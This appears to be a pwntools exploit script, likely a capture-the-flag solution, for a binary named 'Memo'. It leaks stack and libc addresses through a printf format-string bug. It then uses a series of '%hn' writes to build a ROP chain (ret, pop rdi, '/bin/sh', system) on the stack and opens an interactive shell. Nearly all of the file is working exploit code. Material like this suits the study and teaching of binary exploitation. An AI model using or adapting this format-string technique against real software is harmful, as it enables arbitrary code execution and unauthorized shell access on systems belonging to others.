from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc.so.6')
elf = ELF('./Memo')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./Memo")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0x1462)
''')

def wm(a):
    sa(b'choice: ', b'1')
    sa(b'memo: ', a)

def show():
    sa(b'choice: ', b'2')

payload = b'%10$p.%79$p'
wm(payload)
show()

ru(b'0x')
stack_addr = int(rc(12), 16)
pr('stack_addr', stack_addr)
ru(b'0x')
libc.address = int(rc(12), 16) - 243 - libc.sym['__libc_start_main']
pr('libc.address', libc.address)
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))
rdi = libc.address + 0x23b6a
ret_addr = stack_addr - 0x218
ret = libc.address + 0x22679

low = ret & 0xffff
mid = (ret >> 16) & 0xffff
high = (ret >> 32) & 0xffff

pr('low', low)
pr('mid', mid)
pr('high', high)

payload =  b'%' + str(low + 1 + 0xffff).encode() + b'c%18$hn' 
payload = payload.ljust(0x10, b'a') + p64(ret_addr)
wm(payload)
payload =  b'%' + str(mid + 1 + 0xffff).encode() + b'c%22$hn'
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 2)
wm(payload)
payload =  b'%' + str(high + 1 + 0xffff).encode() + b'c%26$hn'
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 4)
wm(payload)

low = rdi & 0xffff
mid = (rdi >> 16) & 0xffff
high = (rdi >> 32) & 0xffff

pr('low', low)
pr('mid', mid)
pr('high', high)

payload =  b'%' + str(low + 1 + 0xffff).encode() + b'c%30$hn' 
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 8)
wm(payload)
payload =  b'%' + str(mid + 1 + 0xffff).encode() + b'c%34$hn'
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 8 + 2)
wm(payload)
payload =  b'%' + str(high + 1 + 0xffff).encode() + b'c%38$hn'
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 8 + 4)
wm(payload)
payload =  b'%' + str(1 + 0xffff).encode() + b'c%42$hn'
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 8 + 6)
wm(payload)

low = binsh & 0xffff
mid = (binsh >> 16) & 0xffff
high = (binsh >> 32) & 0xffff

pr('low', low)
pr('mid', mid)
pr('high', high)

payload =  b'%' + str(low + 1 + 0xffff).encode() + b'c%46$hn' 
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 16)
wm(payload)
payload =  b'%' + str(mid + 1 + 0xffff).encode() + b'c%50$hn'
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 16 + 2)
wm(payload)
payload =  b'%' + str(high + 1 + 0xffff).encode() + b'c%54$hn'
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 16 + 4)
wm(payload)
payload =  b'%' + str(1 + 0xffff).encode() + b'c%58$hn'
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 16 + 6)
wm(payload)

low = system & 0xffff
mid = (system >> 16) & 0xffff
high = (system >> 32) & 0xffff

pr('low', low)
pr('mid', mid)
pr('high', high)


payload =  b'%' + str(low + 1 + 0xffff).encode() + b'c%62$hn' 
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 24)
wm(payload)
payload =  b'%' + str(mid + 1 + 0xffff).encode() + b'c%66$hn'
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 24 + 2)
wm(payload)
payload =  b'%' + str(high + 1 + 0xffff).encode() + b'c%70$hn'
payload = payload.ljust(0x10, b'a') + p64(ret_addr + 24 + 4)
wm(payload)


show()


shell()
